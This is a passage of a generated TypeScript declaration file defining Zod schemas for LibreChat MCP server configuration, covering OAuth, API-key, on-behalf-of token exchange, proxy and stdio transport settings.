     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodUnion<[z.ZodLiteral<"streamable-http">, z.ZodLiteral<"http">]>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>]>;
export declare const MCPServersSchema: z.ZodRecord<z.ZodString, z.ZodUnion<[z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"stdio">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    /**
     * The executable to run to start the server.
     */
    command: z.ZodString;
    /**
     * Command line arguments to pass to the executable.
     */
    args: z.ZodArray<z.ZodString, "many">;
    /**
     * The environment to use when spawning the process.
     *
     * If not specified, the result of getDefaultEnvironment() will be used.
     * Environment variables can be referenced using ${VAR_NAME} syntax.
     */
    env: z.ZodEffects<z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>, Record<string, string> | undefined, Record<string, string> | undefined>;
    /**
     * How to handle stderr of the child process.
     * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
     * Defaults to "inherit".
     */
    stderr: z.ZodOptional<z.ZodUnion<[z.ZodEnum<["pipe", "ignore", "inherit"]>, z.ZodNumber]>>;
}, "strip", z.ZodTypeAny, {
    type: "stdio";
    command: string;
    args: string[];
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}, {
    command: string;
    args: string[];
    type?: "stdio" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
